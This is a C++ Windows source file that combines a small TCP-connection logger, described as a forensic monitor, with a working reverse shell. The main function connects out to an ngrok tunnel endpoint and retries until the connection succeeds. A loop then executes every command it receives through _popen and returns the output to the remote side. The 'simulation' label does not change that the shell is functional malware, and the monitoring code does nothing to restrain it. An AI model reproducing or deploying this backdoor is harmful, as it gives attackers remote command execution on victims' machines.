#include <bits/stdc++.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>
#include <cstring>
#include <cstdlib>
#include <fstream>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#define bzero(p,size) (void)memset((p),0,(size))

using namespace std;

int sock;

// 🛡️ Forensic Monitor: Detect suspicious TCP connections
void logSuspiciousConnection(const char* remoteIP, int remotePort) {
    SYSTEMTIME time;
    GetLocalTime(&time);

    if (remotePort == 19849 || strstr(remoteIP, "3.") == remoteIP || strstr(remoteIP, "18.") == remoteIP) {
        printf("[!] Suspicious Ngrok-style connection detected:\n");
        printf("    IP: %s | Port: %d | Time: %02d:%02d:%02d\n",
               remoteIP, remotePort, time.wHour, time.wMinute, time.wSecond);
    }
}

void monitorConnections() {
    DWORD size = 0;
    PMIB_TCPTABLE tcpTable = NULL;

    if (GetTcpTable(NULL, &size, TRUE) == ERROR_INSUFFICIENT_BUFFER) {
        tcpTable = (PMIB_TCPTABLE)malloc(size);
        if (tcpTable == NULL) {
            printf("Memory allocation failed.\n");
            return;
        }

        if (GetTcpTable(tcpTable, &size, TRUE) == NO_ERROR) {
            for (DWORD i = 0; i < tcpTable->dwNumEntries; i++) {
                MIB_TCPROW row = tcpTable->table[i];
                struct in_addr remoteAddr;
                remoteAddr.S_un.S_addr = row.dwRemoteAddr;

                int remotePort = ntohs((u_short)row.dwRemotePort);
                char* remoteIP = inet_ntoa(remoteAddr);

                logSuspiciousConnection(remoteIP, remotePort);
            }
        } else {
            printf("Failed to retrieve TCP table.\n");
        }

        free(tcpTable);
    } else {
        printf("Failed to get buffer size.\n");
    }
}

// 🧨 Reverse Shell Simulation (Attacker-side)
void shellLoop() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (true) {
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        recv(sock, buffer, sizeof(buffer), 0);

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            exit(0);
        } else {
            FILE *fp = _popen(buffer, "r");
            while (fgets(container, sizeof(container), fp) != NULL) {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

int main() {
    WSADATA wsaData;
    struct sockaddr_in x;
    const char *ip = "0.tcp.in.ngrok.io"; // Ngrok TCP endpoint
    int port = 19849; // Replace with your actual Ngrok port

    WSAStartup(MAKEWORD(2, 0), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&x, sizeof(x));

    x.sin_family = AF_INET;
    x.sin_port = htons(port);

    struct hostent *host;
    host = gethostbyname(ip);
    x.sin_addr = *((struct in_addr *)host->h_addr);

    while (connect(sock, (struct sockaddr *)&x, sizeof(x)) != 0) {
        Sleep(10);
    }

    // 🛡️ Start monitoring in parallel
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)monitorConnections, NULL, 0, NULL);

    // 🧨 Start reverse shell loop
    shellLoop();

    return 0;
}
